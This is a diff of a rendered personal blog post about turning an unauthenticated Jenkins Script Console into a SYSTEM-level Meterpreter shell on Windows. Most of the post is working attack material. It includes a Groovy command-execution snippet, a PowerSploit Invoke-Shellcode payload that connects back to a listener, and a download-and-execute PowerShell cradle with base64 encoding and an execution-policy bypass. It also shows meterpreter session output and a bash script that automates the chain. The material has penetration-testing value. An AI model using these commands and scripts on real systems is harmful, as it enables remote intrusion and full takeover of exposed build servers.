@@ -14,21 +14,12 @@
     "@type" : "BlogPosting",
     "mainEntityOfPage": {
          "@type": "WebPage",
-         "@id": "https://leonjza.github.io"
+         "@id": "https:\/\/leonjza.github.io"
     },
     "articleSection" : "post",
     "name" : "jenkins to meterpreter toying with powersploit",
     "headline" : "jenkins to meterpreter toying with powersploit",
-    "description" : "<figure>
-    
-        <img src="https://leonjza.github.io/images/jenkins_logo.png" />
-    
-    
-</figure>
-
-
-<p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
-</p>",
+    "description" : "\u003cfigure\u003e\n    \u003cimg src=\u0022\/images\/jenkins_logo.png\u0022\/\u003e \n\u003c\/figure\u003e\n\n\u003cp\u003eRecently I came across a few \u003ca href=\u0022https:\/\/jenkins-ci.org\/\u0022\u003eJenkins\u003c\/a\u003e continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be \u003cem\u003e\u0026lsquo;secure\u0026rsquo;\u003c\/em\u003e. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.\u003c\/p\u003e",
     "inLanguage" : "en-US",
     "author" : "Leon Jacobs",
     "creator" : "Leon Jacobs",
@@ -36,10 +27,10 @@
     "accountablePerson" : "Leon Jacobs",
     "copyrightHolder" : "Leon Jacobs",
     "copyrightYear" : "2015",
-    "datePublished": "2015-05-27 20:40:40 &#43;0000 UTC",
-    "dateModified" : "2015-05-27 20:40:40 &#43;0000 UTC",
-    "url" : "https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter-toying-with-powersploit/",
-    "wordCount" : "1018",
+    "datePublished": "2015-05-27 20:40:40 \u002b0000 UTC",
+    "dateModified" : "2015-05-27 20:40:40 \u002b0000 UTC",
+    "url" : "https:\/\/leonjza.github.io\/blog\/2015\/05\/27\/jenkins-to-meterpreter-toying-with-powersploit\/",
+    "wordCount" : "1015",
     "keywords" : [ "powershell","meterpreter","jenkins","command execution","Blog" ]
 }
 </script>
@@ -87,7 +78,7 @@
     <div class="sidebar-about">
       
       <h1></h1>
-      <p class="lead">#!/slash/note<br />
+      <p class="lead">#!/slash/note<br>
 <em>A checkbox unchecker&rsquo;s notepad</em></p>
     </div>
 
@@ -116,7 +107,7 @@
 
     
 
-    <p>Copyright &copy; 2018 <a href="https://leonjza.github.io/license/">License</a><br/>
+    <p>Copyright &copy; 2020 <a href="https://leonjza.github.io/license/">License</a><br/>
        Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
 
   </div>
@@ -132,156 +123,94 @@
     <a class="label" href="https://leonjza.github.io/categories/powershell">powershell</a><a class="label" href="https://leonjza.github.io/categories/meterpreter">meterpreter</a><a class="label" href="https://leonjza.github.io/categories/jenkins">jenkins</a><a class="label" href="https://leonjza.github.io/categories/command-execution">command execution</a>
     </span>
     <figure>
-    
-        <img src="https://leonjza.github.io/images/jenkins_logo.png" />
-    
-    
+    <img src="https://leonjza.github.io/images/jenkins_logo.png"/> 
 </figure>
 
-
-<p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
-</p>
-
+<p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
 <h2 id="groooooooovy">groooooooovy</h2>
-
 <p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
-
-
 <figure>
-    
-        <img src="https://leonjza.github.io/images/jenkins_script_console.png" />
-    
-    
+    <img src="https://leonjza.github.io/images/jenkins_script_console.png"/> 
 </figure>
 
-
-<p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.&rsquo;</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the <a href="http://www.groovy-lang.org/groovy-dev-kit.html#process-management">documentation</a>.</p>
-
-<pre><code class="language-text">def process = &quot;ls -l&quot;.execute()
-println &quot;Found text ${process.text}&quot;
-</code></pre>
-
-<p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
-
-
+<p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.'</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the <a href="http://www.groovy-lang.org/groovy-dev-kit.html#process-management">documentation</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">def process = &#34;ls -l&#34;.execute()
+println &#34;Found text ${process.text}&#34;
+</code></pre></div><p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
 <figure>
-    
-        <img src="https://leonjza.github.io/images/jenkins_console_command_exec.png" />
-    
-    
+    <img src="https://leonjza.github.io/images/jenkins_console_command_exec.png"/> 
 </figure>
-
 
 <p>Nice and easy command execution! :D</p>
-
 <h2 id="interactive-shell-power-shell">interactive shell, power shell</h2>
-
 <p>Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> and moving on from there. On Windows based environments though, the builtin <code>cmd.exe</code> definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.</p>
-
 <p>The one Jenkins machine that I had found was running on Windows as <code>nt authority\system</code>, which of course was <em>great</em> news! I figured though that in order to get a meterpreter shell, I&rsquo;d have to approach this in some conventional way. Either obtaining credentials somehow and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. Some investigations showed though that the AV on the box was killing the meterpreter.exe on the box so that option was out as well. So, next on the list? I could just make use of <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a> to download and execute one using one command.</p>
-
 <p>Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.</p>
-
 <p>In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A <code>payload</code> which includes the <code>Invoke-Shellcode.ps1</code> powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&rsquo;t worry it should be more clear after we have gone through it.</p>
-
 <h2 id="preparing-the-payload">preparing the payload</h2>
-
 <p>As already mentioned, I was going to use <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a>. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about <em>payload</em> here, all it really is is a file that will be made available via HTTP for the powershell script to download.</p>
-
 <p>The payload will consist of 2 parts. First, defining <code>function Invoke-Shellcode {}</code>, and then invoking the function for a <code>windows/meterpreter/reverse_https</code> shell. Kali Linux has powersploit available in <code>/usr/share</code> so all I really did was cat it to my <code>payload</code> file:</p>
-
-<pre><code class="language-bash">$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
-</code></pre>
-
-<p>After that, I added the following line to the <code>payload</code> file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:</p>
-
-<pre><code class="language-bash">Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
-</code></pre>
-
-<p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at <a href="http://192.168.252.1:8000/payload">http://192.168.252.1:8000/payload</a>.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
+</code></pre></div><p>After that, I added the following line to the <code>payload</code> file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport <span style="color:#ae81ff">443</span> -Force
+</code></pre></div><p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at http://192.168.252.1:8000/payload.</p>
 <h2 id="preparing-the-command">preparing the command</h2>
-
-<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a [Net.WebClient.DownloadString](<a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx">https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx</a>) object to download the payload we previously prepared and execute it.</p>
-
-<pre><code class="language-powershell">iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')
-</code></pre>
-
-<p>That whole command needs to be <a href="http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx">encoded</a> so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.</p>
-
-<pre><code class="language-bash">echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
-</code></pre>
-
-<p>The above will output a base64 encoded string that should be passed to the Powershell <code>-Enc</code> flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing <code>-Exec ByPass</code> to the powershell executable. So, in summary, the command will be as follows:</p>
-
-<pre><code class="language-powershell">cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
-</code></pre>
-
-<h2 id="pwn">pwn</h2>
-
+<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a [Net.WebClient.DownloadString](<a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx)">https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx)</a> object to download the payload we previously prepared and execute it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://192.168.252.1:8000/payload&#39;</span>)
+</code></pre></div><p>That whole command needs to be <a href="http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx">encoded</a> so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo $scriptblock | iconv --to-code UTF-16LE | base64 -w <span style="color:#ae81ff">0</span>
+</code></pre></div><p>The above will output a base64 encoded string that should be passed to the Powershell <code>-Enc</code> flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing <code>-Exec ByPass</code> to the powershell executable. So, in summary, the command will be as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 <span style="color:#66d9ef">[snip]</span> BjBkACcAKQAKAA==
+</code></pre></div><h2 id="pwn">pwn</h2>
 <p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
-
-
 <figure>
-    
-        <img src="https://leonjza.github.io/images/jenkins_powershell_payload.png" />
-    
-    
+    <img src="https://leonjza.github.io/images/jenkins_powershell_payload.png"/> 
 </figure>
 
-
 <p>From the python web server we can see the request come in for the payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">192.168.252.100 - - [28/May/2015 12:37:15] &#34;GET /payload HTTP/1.1&#34; 200 -
+</code></pre></div><p>And pop!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; exploit
 
-<pre><code class="language-text">192.168.252.100 - - [28/May/2015 12:37:15] &quot;GET /payload HTTP/1.1&quot; 200 -
-</code></pre>
-
-<p>And pop!</p>
-
-<pre><code class="language-bash">msf exploit(handler) &gt; exploit
-
-[*] Started HTTPS reverse handler on https://0.0.0.0:443/
-[*] Starting the payload handler...
-[*] 192.168.252.100:54023 Request received for /INITM...
-[*] 192.168.252.100:54023 Staging connection for target /INITM received...
-[*] Meterpreter session 1 opened (192.168.252.1:443 -&gt; 192.168.252.100:54023) at 2015-05-28 12:37:17 +0200
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started HTTPS reverse handler on https://0.0.0.0:443/
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting the payload handler...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.252.100:54023 Request received <span style="color:#66d9ef">for</span> /INITM...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.252.100:54023 Staging connection <span style="color:#66d9ef">for</span> target /INITM received...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.252.1:443 -&gt; 192.168.252.100:54023<span style="color:#f92672">)</span> at 2015-05-28 12:37:17 +0200
 
 meterpreter &gt;
 meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM
-</code></pre>
-
-<h2 id="automation">automation</h2>
-
+Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</code></pre></div><h2 id="automation">automation</h2>
 <p>While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># meterpreter ip &amp; port</span>
+lhost<span style="color:#f92672">=</span>192.168.252.1
+lport<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>
 
-<pre><code class="language-bash">#!/bin/bash
-
-# meterpreter ip &amp; port
-lhost=192.168.252.1
-lport=443
-
-echo &quot; * Writing Payload&quot;
+echo <span style="color:#e6db74">&#34; * Writing Payload&#34;</span>
 cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
-echo &quot;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force&quot; &gt;&gt; payload
+echo <span style="color:#e6db74">&#34;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost </span>$lhost<span style="color:#e6db74"> -Lport </span>$lport<span style="color:#e6db74"> -Force&#34;</span> &gt;&gt; payload
 
-echo &quot; * Prepping Command&quot;
-scriptblock=&quot;iex (New-Object Net.WebClient).DownloadString('http://$lhost:8000/payload')&quot;
+echo <span style="color:#e6db74">&#34; * Prepping Command&#34;</span>
+scriptblock<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://</span>$lhost<span style="color:#e6db74">:8000/payload&#39;)&#34;</span>
 echo $scriptblock
 
 echo
-echo &quot; * Encoding command&quot;
-encode=&quot;`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`&quot;
+echo <span style="color:#e6db74">&#34; * Encoding command&#34;</span>
+encode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`echo </span>$scriptblock<span style="color:#e6db74"> | iconv --to-code UTF-16LE | base64 -w 0`&#34;</span>
 echo $encode
 
-command=&quot;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode&quot;
+command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc </span>$encode<span style="color:#e6db74">&#34;</span>
 echo
-echo &quot; * Final command&quot;
+echo <span style="color:#e6db74">&#34; * Final command&#34;</span>
 echo $command
 
 echo
-echo &quot; * Starting HTTP Server to serve payload&quot;
+echo <span style="color:#e6db74">&#34; * Starting HTTP Server to serve payload&#34;</span>
 python -m SimpleHTTPServer
-</code></pre>
+</code></pre></div>
   </div>
   <div id="disqus_thread"></div>
 </div>
